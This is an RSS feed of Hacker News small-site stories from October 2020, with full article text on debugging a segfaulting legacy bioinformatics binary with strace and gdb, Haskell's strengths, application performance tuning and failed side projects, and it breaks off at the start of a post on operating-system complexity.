<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 02 Nov 2020 00:47:11 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 02 Nov 2020 00:47:11 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Extreme Debugging]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950120">thread link</a>) | @merlinscholz
<br/>
October 31, 2020 | https://squanderingti.me/blog/2020/10/28/extreme-debugging.html | <a href="https://web.archive.org/web/*/https://squanderingti.me/blog/2020/10/28/extreme-debugging.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    



    <div role="main">
      <div>
        




<article>
  <p>There‚Äôs debugging and there‚Äôs <em>debugging</em>.
This is a story of the latter.
Before we get into this jaunt I‚Äôd like to add that I‚Äôve written this piece to mimic how we actually got to the conclusion.
If you‚Äôre experienced in strange stuff you might see a faster route or use a different tool.
There‚Äôs more than one way to do most of this and this was what I had at hand when I needed it.</p>

<h2 id="all-stories-start-somewhere">All stories start somewhere</h2>

<p>Some background first.
I‚Äôm currently working in a bioinformatics lab that works on the functional identification of proteins.
One of our projects requires that we benchmark against an older tool that performs a similar function.
I‚Äôm not going to throw the particular tool under the bus, but needless to say, it‚Äôs charming in a way that only academic software can be.</p>

<ul>
  <li>Documentation ranges from ‚Äúpoor‚Äù to ‚Äúnonexistent.‚Äù</li>
  <li>It‚Äôs held together with an unholy amalgamation of Perl, awk, tsch, and yes, <strong>Fortran</strong>.</li>
  <li>It includes/distributes binaries to other programs that the internet has <em>forgotten</em>.</li>
  <li>Some of the copyright headers are from when I was in elementary school- others before even that.</li>
</ul>

<p>So‚Ä¶ ‚Äúcharming.‚Äù
A web-based version is available but is limited to how many proteins you can submit (via cgi-bin!) within a 24 hour window (it‚Äôs a low number- say ~100) and we need to process well over 100k.
So the naive, innocent question that started this was:</p>

<blockquote>
  <p>‚ÄúWell, can we run it locally?‚Äù</p>
</blockquote>

<p>After all, all the pieces are available for download so it would seem simple enough, right?
You can probably already surmise the answer since you‚Äôre reading an article called ‚Äúextreme debugging.‚Äù</p>

<p>I‚Äôm going to focus on a small pieces of a much larger puzzle called <code>netNGlyc</code>.
This handy, dandy little program is used to predict <a href="https://en.wikipedia.org/wiki/N-linked_glycosylation">N-glycosylation</a> sites in proteins.
It‚Äôs distributed as a tarball.
Easy enough!</p>

<p>We can unpack it, and then perform setup by editing its main file <code>netNglyc</code> (written in <code>tsch</code>) by specifying the path to the unpacked dir.
Easy peazy.
And then we run the quick test and‚Ä¶</p>

<p><img src="https://squanderingti.me/img/nGlyc/seg_faults.gif" alt="">
<em>All the segfaults</em></p>

<h2 id="what-process-is-actually-segfaulting">What process is actually segfaulting?</h2>
<p>The entry point into this program is a <code>tsch</code> script that calls numerous additional <code>awk</code> and <code>tsch</code> files.
We have a few options we can try.</p>

<p>If kernel logging is enabled, then <code>dmesg</code> logs might include the offender like the following.</p>

<div><div><pre><code>[30590535.213144] how98_Linux[1560171]: segfault at 8000000 ip 00000000080744f7 sp 00000000ffb8a114 error 4 in how98_Linux[8048000+5a000]
</code></pre></div></div>

<p>A second option, assuming <code>dmesg</code> doesn‚Äôt include this or doesn‚Äôt help, is to use <code>strace</code>.
If you don‚Äôt have much experience with <code>strace</code> and you work on Linux frequently, it‚Äôs very much worth your while to learn this tool.
We‚Äôre going to use it with <code>-f</code> for ‚Äúfollow process forking‚Äù so we can see everything that ends up being called.
We‚Äôre also invoking it with <code>-o</code> so we can write the output to a file and go through it.</p>

<div><div><pre><code>strace -f -o /tmp/debugging ./netNglyc test/LEUK_RAT.fsa
</code></pre></div></div>

<p>And then look through the output:</p>

<div><div><pre><code>grep SIGSEGV /tmp/debugging
</code></pre></div></div>

<p>Looking for <code>SIGSEGV</code> will show us everywhere a segfault signal was handled.
We‚Äôll hopefully see lines like the following, where the left-most integer is the PID of the process.</p>

<div><div><pre><code>1560785 +++ killed by SIGSEGV (core dumped) +++
</code></pre></div></div>

<p>Now we can grep for both the PID and the <code>execve</code> syscall<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> to see what program was launched.</p>

<div><div><pre><code>grep 1560785 /tmp/debugging | grep exec
</code></pre></div></div>

<p>Lo and behold:</p>

<div><div><pre><code>1560785 execve("/mnt/home/cchandler/ceph/Programs/netNglyc-1.0-broken/how/how98_Linux", ["/mnt/home/cchandler/ceph/Program"...], [/* 89 vars */]) = 0
</code></pre></div></div>

<h2 id="exploring-the-target">Exploring the target</h2>

<p>We have our culprit.
It‚Äôs whatever <code>how98_Linux</code> is.
First question: what exactly is it?</p>

<div><div><pre><code>$ file how98_Linux
how98_Linux: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.0.0, stripped
</code></pre></div></div>

<p>Oh.
So the thing crashing is an <em>old</em> statically linked binary that‚Äôs been fully stripped<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p>A quick run of <code>nm</code> will confirm the awful truth and yield the same result.</p>

<div><div><pre><code>$nm how98_Linux
nm: how98_Linux: no symbols
</code></pre></div></div>

<p>So let‚Äôs quickly recap what we learned:</p>

<ol>
  <li>We have a 32-bit ELF binary</li>
  <li>Statically linked with glibc</li>
  <li>Against Linux ABI 2.0.0 (for the record: that‚Äôs from 1996)</li>
  <li>And it has no symbol table</li>
</ol>

<h2 id="maybe-recreate-its-input">Maybe recreate its input?</h2>

<p>The question at hand is now: is there something wrong with this ancient program, or is there something wrong with our environment?
After all, it‚Äôs been in use for years and years (right??).
Inspecting the binary is going to take some effort, so maybe the best approach is to make sure that the input files are correct.
Previously, we‚Äôve run into problems with other programs like this thanks to subtle differences between shells or between <code>gawk</code> vs <code>awk</code> etc.</p>

<p>From the <code>strace</code> output for <code>exec</code> we can see the program didn‚Äôt actually take any arguments.
Right after the name of the program there‚Äôre square brackets indicating the arguments.
If I make up an argument like ‚Äúasdf‚Äù and pass it to the program you can see it.</p>

<div><div><pre><code>$strace -f -eexecve ~/ceph/Programs/netNglyc-1.0-broken/how/how98_Linux asdf

execve("/mnt/home/cchandler/ceph/Programs/netNglyc-1.0-broken/how/how98_Linux", ["/mnt/home/cchandler/ceph/Program"..., "asdf"], [/* 65 vars */]) = 0
</code></pre></div></div>

<p>It would be a fairly logical deduction to say that it must be reading from <code>stdin</code>.
Indeed, the <code>strace</code> output contains a <code>read(0)</code>.</p>

<div><div><pre><code>1560785 read(0,  &lt;unfinished ...&gt;
1560785 &lt;... read resumed&gt; "********************************"..., 4096) = 4096
</code></pre></div></div>

<p>On Linux, file descriptor 0 is always <code>stdin</code><sup id="fnref:5" role="doc-noteref"><a href="#fn:5">3</a></sup>.
It‚Äôs starting to look like we‚Äôre not going to get out of digging through all the <code>tsch</code> and <code>awk</code>.
Secondly, that line of stars ‚Äú*****‚Äù is actually a preview of the what the process read, and we can find a matching call above to <code>write</code>.</p>

<div><div><pre><code>1560675 write(1, "********************************"..., 4096 &lt;unfinished ...&gt;
</code></pre></div></div>

<p>Yup. Here we have the file descriptor 1 which is always <code>stdout</code>.</p>

<p>Everything is being redirected via pipes.
Unfortunately, reconstructing the movement of data through pipes is extremely non-trivial.
<em>Somewhere</em> in the <code>strace</code> output we‚Äôre going to find some calls to <code>open()</code> which will reveal the paths to the specific files we‚Äôre looking for.
Double unfortunately, if they‚Äôre interleaved with <code>chdir</code> calls we might only have relative paths.
There‚Äôs also the problem of just a <strong>ton</strong> of data.
A quick run of <code>strace</code> tracking only <code>open()</code> calls yields thousands of results.</p>

<div><div><pre><code>strace -f -eopen -o /tmp/opens ./netNglyc test/LEUK_RAT.fsa
*output omitted*

wc -l /tmp/opens
5489 /tmp/opens
</code></pre></div></div>

<p>Ugh.
Even if we filter out all the <code>open</code> calls to library files we‚Äôre still left with north of 2k results.
An alternate approach might be needed.</p>

<h2 id="a-break--a-very-surprising-twist">A break &amp; a very surprising twist</h2>

<p>Break time.</p>

<p>Time to switch gears and deal with a few other things.
How about making a copy of <code>netNGlyc</code> in my home directory so I can do some more analysis later.
Let‚Äôs give it a run to make sure the error is reproducible.</p>

<p><img src="https://squanderingti.me/img/nGlyc/working.gif" alt="">
<em>Excuse me?</em></p>

<p><em>Of course</em> it ran correctly.
No segfaults. No goofy messages.</p>

<p>Somehow, copying the files to my home directory fixes everything.
No permissions were modified in the process.
The only difference between the working copy and broken copy are which filesystem they‚Äôre running on<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">4</a></sup>.
It‚Äôs suddenly starting to appear that this segfault is somehow filesystem related.</p>

<p>But that‚Äôs nonsense.
What could it possibly be doing that would interfere with the underlying filesystem?</p>

<h2 id="sleep--the-inputs-at-last">Sleep &amp; the inputs at last</h2>

<p>The next morning.</p>

<p>Part of the problem with locating the errant inputs is that the <code>netNGlyc</code> script cleans up after itself.
It‚Äôs doing this via <code>rm -rf</code> on its temp directory.
Commenting that out we now have a <code>tmp</code> directory full of subdirectories.
We can combine our sequence of asterisks from the <code>strace</code> output with <code>grep</code> to finally locate the files in question.</p>

<div><div><pre><code>$ grep -H '^\*\*\*\*' * | sort | uniq
how.test.dat:**************************************************************************
tmp.dat.1576058:**************************************************************************
tmp.dat.1576071:**************************************************************************
tmp.dat.1576086:**************************************************************************
tmp.dat.1576098:**************************************************************************
tmp.dat.1576110:**************************************************************************
tmp.dat.1576153:**************************************************************************
tmp.dat.1576192:**************************************************************************
tmp.dat.1576235:**************************************************************************
tmp.dat.1576258:**************************************************************************
</code></pre></div></div>

<p>The input files are all named something like <code>tmp.dat.123456</code>.
The trailing number in the filename (<code>-H</code> to <code>grep</code>) is likely the PID of the process that originally created it.</p>

<p>Let‚Äôs pipe one of these files to our friend <code>how98_Linux</code>.</p>
<div><div><pre><code>$ ../../how/how98_Linux &lt; tmp.dat.1576192
open: can't stat file
apparent state: unit 3 named test.how
lately reading sequential formatted external IO
Segmentation fault (core dumped)
</code></pre></div></div>

<p>Fantastic! We finally have a small chunk of iterable work that we can play with.
The copy in my home directory works the same way, except of course that it outputs the correct result.</p>

<h2 id="a-hammer-named-gdb">A hammer named GDB</h2>

<p>Maybe there‚Äôs <em>something</em> we can learn from this binary.
Every time in my career that I‚Äôve had to reach for <code>strace</code> and <code>gdb</code> to fix third-party code it has been a tale of woe.</p>

<p>This case is probably no different.</p>

<p>Remember that stripped symbol table?
Normally we could run <code>where</code> inside <code>gdb</code> and it would return all the frames on the stack.</p>

<div><div><pre><code>(gdb) run &lt; tmp.dat.1576058
Starting program: /mnt/ceph/users/cchandler/Programs/netNglyc-1.0-broken/tmp/netNglyc-1576032/../../how/how98_Linux &lt; tmp.dat.1576058
open: can't stat file
apparent state: unit 3 named test.how
lately reading sequential formatted external IO

Program received signal SIGSEGV, Segmentation fault.
0x080744f7 in ?? ()
(gdb) where
#0  0x080744f7 in ?? ()
#1  ‚Ä¶</code></pre></div></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://squanderingti.me/blog/2020/10/28/extreme-debugging.html">https://squanderingti.me/blog/2020/10/28/extreme-debugging.html</a></em></p>]]>
            </description>
            <link>https://squanderingti.me/blog/2020/10/28/extreme-debugging.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950120</guid>
            <pubDate>Sat, 31 Oct 2020 09:49:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950102">thread link</a>) | @_query
<br/>
October 31, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There‚Äôs been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it‚Äôs ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That‚Äôs how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It‚Äôs really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it‚Äôs highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it‚Äôs finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there‚Äôs now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it‚Äôs finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950102</guid>
            <pubDate>Sat, 31 Oct 2020 09:46:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Improvements]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950014">thread link</a>) | @scary-size
<br/>
October 31, 2020 | https://franz.hamburg/writing/performance-improvements.html | <a href="https://web.archive.org/web/*/https://franz.hamburg/writing/performance-improvements.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>2020-10-31</p>
      <p>
        This post will describe a performance guide I presented to my team
        last week. We encountered some issues with one of our services due to
        configuration change. The change quadrupled the average processing
        time for a single message. To be more precise, the change happened in
        the data mapping DSL, which helps analysts describe how input data is
        mapped to output data. Read more about it
        <a href="https://www.otto.de/jobs/technology/techblog/artikel/adatamappingdsl.php">here</a>
        here. I took this week to make the service run at a reasonable speed
        again. Below you‚Äôll find the approach I take, when trying to improve
        application performance.
      </p>
      <p>
        <em>Disclaimer: There will be a lot of assumptions and the guide
          often talks about message processing. I understand that this doesn‚Äôt
          represent every application, but the core principles mentioned in the
          ‚ÄúPrerequisites‚Äù section still stand. I‚Äôm mostly using the term
          ‚Äûapplication‚Äú here, but I really mean any type of software, be it a
          backend service, frontend app or simple script.
        </em>
      </p>
      <h3>Motivation</h3>
      <img src="https://franz.hamburg/assets/images/performance-improvements-1.jpg" alt="graph showing average provessing time per message">
      <p>
        There is a wide range of reasons, why the performance of an application needs to be improved:
      </p><ol>
        <li>The application would be able to run more efficiently <a href="#footnote-1">[1]</a>.</li>
        <li>The application needs to run faster to be worth running at all, for it to be economical.</li>
        <li>Performance is a competitive advantage <a href="#footnote-2">[2]</a>.</li>
        <li>The high standards of the developer aren‚Äôt met.</li>
        <li>And many others: More stable, predictable runtime behaviour, increased future load, building a strong basis
          for future features.</li>
      </ol>
      

      <h3>Prerequisites</h3>
      <p>
        To actually make an impact on application performance, you‚Äôll need to fulfil some requirements. There needs to
        be <strong>measurability</strong>. You need to be able to measure the metric you want to go down/up. You can
        record those by
        doing local benchmarks or by actually reporting metrics to a metric backend (Prometheus, CloudWatch or similar).
        Though the latter one might be to coarse.
      </p>
      <p>
        The next thing you want is <strong>reproducibility</strong>, you‚Äôll need to be able to reproduce your measured
        results. Your
        application should be able to process the same n messages in the same amount of time. Also replaying the same
        input data should work effortless. This can actually be pretty tough, if your application depends on an external
        system like a database, a message broker or another cloud-thingy; I‚Äôll get to that down the line.
      </p>
      <p>
        The final piece is <strong>profiling</strong>, which enables you to drill down on what your application spends
        its time on. It‚Äôs
        mandatory that you can investigate which components of your application you should improve: If your app is
        spending 80% of its CPU time on JSON parsing, you should probably focus on that area. Maybe switch to a faster
        parser or a different serialisation format like protobuf. Don‚Äôt go to work on those other 20%, your improvements
        won‚Äôt be very impactful. For profiling flame graphs are a good choice, for smaller scripts you might be able to
        instrument the code yourself.
      </p>
      <p>
        To summarise: you want to measure, reproduce and profile your application‚Äôs runtime behaviour.
      </p>

      <h3>Approach</h3>
      <p>
        Set yourself a goal and a time frame. Both can be rough estimates, but you should stick to them nevertheless.
        Working on performance can be a tricky rabbit hole filled with micro optimisations and intensive swearing.
        Having a plan to stick to keeps you focused on the big wins. This can be as straightforward as: ‚ÄûThis week I‚Äôm
        going to improve message throughput (a measurable metric!) by at least 10 percent points‚Äú. On the other hand you
        shouldn‚Äôt create unnecessary pressure for yourself, if the performance issue can be mitigated by a reasonable
        amount of additional hardware, go for it! The amount of hardware you get compared to a few hours of work is
        substantial. This just shouldn‚Äôt become your default solution.
      </p>
      <p>
        It‚Äôs time to get your hands dirty, you should be able to start your application locally and put data into it.
        Preferably you want to cut out external system like remote databases. Can you extract your core business logic
        from the dirty gripes of remote data fetching? Great, setup up a standalone version of your app, which can read
        input from file or a local database. Otherwise do your best to at least make your input data deterministic. Work
        with a frozen database table or re-read that Kafka topic from a known point. If you are having a hard time with
        that, it might be wise to spend some time upfront and work on better a separation of concerns within your
        application. Knowledge about where your data lives and gets send off to shouldn‚Äôt leak into the business side of
        things, push those concerns onto the edges of your application. The next item on the list is to establish a
        baseline measurement, something you can later use to make a comparison. I‚Äôm a fan of documenting those
        measurements in a spreadsheet. It helps with calculating differences and allows you to document future changes.
      </p>
      <p>
        Now you can finally get into things, run the benchmark/standalone version and attach the profiler. You probably
        already have some suspicions about what might slow the application down, confirm those with actual numbers.
        There might also be a lot of low-hanging fruits, which will only take a few minutes to fix, but in total will
        already make a noticeable impact. If you find other performance sins, document them and prioritise them
        according to their predicted impact and effort of the fix. Now just rinse and repeat: Fix an issue, validate the
        improvement, profile and start over.
      </p>

      <h3>Typical Pitfalls</h3>
      <p>
        Some common things you might encounter when trying to improve application performance:
      </p><ul>
        <li>Actually static values which will be recalculated very very often and are surprisingly expensive to do so.
          I found a regular expression which was recompiled from a string over 500 times per input messages. The source
          string was known on application start-up.</li>
        <li>A collection of things is calculated, but most of the results are discarded later on. If your iterate over
          a collection to calculate something for each item and later on do a <code>collection.find(...)</code> call,
          you might
          want to use a lazy collection.</li>
        <li>If a single item in a collection is always searched for by a given key: Use a data structure with O(1)
          access like a hash map instead of a sequence. Generally speaking: use the correct data structure for the job
          at hand. It might cost you to convert a JSON array into a map, but that cost will amortize itself surprisingly
          fast.
        </li>
        <li>The Complete Rewrite‚Ñ¢ is probably not the solution to your performance issues.</li>
      </ul>
      

      <h3>Conclusion</h3>
      <p>
        Performance work is fun and rewarding. Though there is a hurdle to establish a reproducible benchmark you can
        run locally, this benchmark will pay off. It is also a useful thing to have for reproducing some of those
        nastier bugs. Improving the core performance of your application will offer you deep insights into your
        programming language of choice and make you more proficient with it. Performance work isn‚Äôt a one-off task you
        do once, you‚Äôll need to continually monitor and measure your application as it will change over time.
      </p>

      <h4>Notes</h4>
      <p id="footnote-1">
        [1] <strong>efficient</strong> meaning less resource consumption (CPU, Memory, Network etc.) for the same
        result.
        Also: Same resource consumption for a better result, for example more frames per second on an UI app.
      </p>
      <p id="footnote-2">
        [2]
        <a href="https://blog.codinghorror.com/speed-still-matters/">Speed still matters</a>,
        <a href="https://www.fastcompany.com/1825005/how-one-second-could-cost-amazon-16-billion-sales">How One Second
          Could Cost Amazon $1.6 Billion In Sales</a>,
        <a href="https://www.gigaspaces.com/blog/amazon-found-every-100ms-of-latency-cost-them-1-in-sales">Amazon Found
          Every 100ms of Latency Cost them 1% in Sales</a>
      </p>

      <p>‚Üê <a href="https://franz.hamburg/writing.html">Other posts</a></p>
    </div></div>]]>
            </description>
            <link>https://franz.hamburg/writing/performance-improvements.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950014</guid>
            <pubDate>Sat, 31 Oct 2020 09:16:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Failed 2 Side Projects in Under a Year and Lessons Learned]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950005">thread link</a>) | @moeminm
<br/>
October 31, 2020 | https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><code>I feel like I should start off this blog post by mentioning that I am a Product Designer with little to no development skills, so I heavily rely on no-code tools to get my side projects up and running.</code></p>
<p>The idea of creating something that thousands of users could potentially use was just so exciting to me. Over the course of just shy of a year, I worked on 2 projects that made me less than $20, <strong>combined</strong>, so I feel like it's safe to say I can share my experience with you guys and hopefully you'll learn from my mistakes.</p>

<p> <img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604131920818/D9DxXPfJk.png?auto=format&amp;q=60" alt="Custom Size ‚Äì 3.png"></p>
<p>Oof, designtarget was a wild ride. On 18-8-2019, god knows what happened but I just hopped on Namecheap and purchased the domain <a href="http://designtarget.org/" target="_blank">designtarget.org</a> with no prior experience in web development. I was just so into the idea of creating the 'ultimate design directory' that I really didn't think anything through. How would I monetize the platform? Do I even have a list of resources that I can work with? Where will I market the website? So many questions, and little to no answers.</p>
<p>I remembered seeing an ad for a visual editor plugin on Wordpress called Elementor, it seemed intuitive so I go to Namecheap's cPanel and install Wordpress, purchase a year's subscription to Elementor and I get building. Literally next day I was done, I didn't think the design through, I just wanted to get an MVP out right away, and this atrociousness was born, but I was proud of it. I had no web development knowledge and I made a website, and it felt great.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604132243316/TKr68CyWaA.png?auto=format&amp;q=60" alt="Web 1920 ‚Äì 1.png"></p>
<p>Naturally, I wanted people to see what I had built, so I go on Reddit and post the website on /r/webdev - no it wasn't a Saturday(you can only post your work on Feedback Saturday on /r/webdev), yes the post was locked. But that doesn't matter, why you ask?</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604132936013/UONs_j1_Z.png?auto=format&amp;q=60" alt="Mask Group 1.png"></p>
<p>8.5k visitors in less than 2 hours of being on reddit when I wasn't supposed to. I knew I was onto something, but a little after the hype died down, it dawned on me, I just missed a huge chance to build an audience. I rushed creating the website that I missed some essentials such as <strong>creating a newsletter sign up</strong> or even just a <strong>blog</strong>.</p>
<p>Fast-forward a few months, I eventually create a newsletter, Instagram page, and even a blog. </p>
<p>üìß ~300 newsletter subscribers.</p>
<p>üì∏ ~400 Instagram followers.</p>
<p>and most importantly, my blogs were ranking on Google. I don't have Search Console screenshots but I had ranked around ~11th or so for a few articles. </p>
<p>I had solved the traffic problem of any side project, but monetization was where this project went downhill. I simply had no monetization plan whatsoever. And this is where the story of designtarget, ends, well, I sold off the project for a measly amount but that was it.</p>
<h3 id="lessons-learned">Lessons learned:</h3>
<p>üëâ No matter how excited you are, keep cool and think things through.</p>
<p>üëâ Traffic is easy, business is hard. </p>
<p>üëâ Think things through, but also do not spend much time working on an MVP.</p>
<p>üëâ It is fine to not know what you're doing.</p>

<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604133785236/39YjxeLlg.png?auto=format&amp;q=60" alt="screencapture-moeminm-github-io-goodcode-2020-10-31-10_42_27.png"></p>
<p>This one is close to my heart, it really is. You can read my <a target="_blank" href="https://www.indiehackers.com/product/good-code/temporarily-pausing-work-on-good-code--MKnKtlnidKMGLMQAuyr">post on IndieHackers</a> to know why I stopped working on Good Code.</p>
<p>The idea originally came to me when I discovered  <a target="_blank" href="http://frontendmentor.io/">Frontend Mentor</a>, by then I had learned HTML, CSS, and a little bit of JavaScript and wanted to improve my skills. I liked FEM, but the free templates were just not the level of design I wanted to work on, queue Good Code.</p>
<p>This time, I was ready, monetization plan was straight-forward, content was ready, community building was in place, newsletter was in place. I cook up a static version of the website using HTML and CSS and release it on Github Pages, you can view Good Code  <a target="_blank" href="https://moeminm.github.io/goodcode">here</a> and straight to reddit I go (and IndieHackers this time as well). </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604134249747/BPvkUcJ5j.png?auto=format&amp;q=60" alt="Mask Group 2.png"></p>
<p>September 3rd, to September 15th. I was onto something, again. Shortly after launching, I view my Gumroad page only to find 2 customers have purchased templates for a total of $10. My first internet money! </p>
<p>I also had people posting their solutions on the <a target="_blank" href="https://www.reddit.com/r/GoodCodeChallenge/">subreddit</a>  I created just for this website, it felt great.</p>
<p>I really wanted to continue working on Good Code, as it stands, it's only hosted on GH Pages, so there's a good chance there <em>could</em> have been more sales had it been on an actual domain. I might resume working on Good Code in a future date, but for now, I'm pausing for reasons listed in the  <a target="_blank" href="https://www.indiehackers.com/product/good-code/temporarily-pausing-work-on-good-code--MKnKtlnidKMGLMQAuyr">IndieHackers post</a>. </p>
<h3 id="lessons-learned">Lessons learned:</h3>
<p>üëâ Spin ideas. I could have just released this as just another website selling Adobe XD templates, but I feel like the 'improve your HTML and CSS skills' twist was what brought this to life.</p>
<p>üëâ Create a community for your side-project.</p>
<p> üëâ Don't be afraid to shut down.</p>
<p>To wrap things up, had I not started designtarget, I wouldn't have learned how to code (albeit being bad at it), had I not learned how to code, I wouldn't have started Good Code and made my first $ from a side-projects, who knows what my next had I not started is going to be, but I feel like it might be success.</p>
</div></div>]]>
            </description>
            <link>https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950005</guid>
            <pubDate>Sat, 31 Oct 2020 09:12:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Complexity in Operating Systems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949983">thread link</a>) | @quyleanh
<br/>
October 31, 2020 | https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html | <a href="https://web.archive.org/web/*/https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Over the last years I‚Äôve been working on very different operating
systems. Operating systems are usually incredibly complex beasts. I
think there are mainly three drivers of this complexity. Surprisingly
enough, neither of these is having to deal with hardware.</p>

<p>The first one is resource <strong>discovery</strong>, i.e. figuring out how the
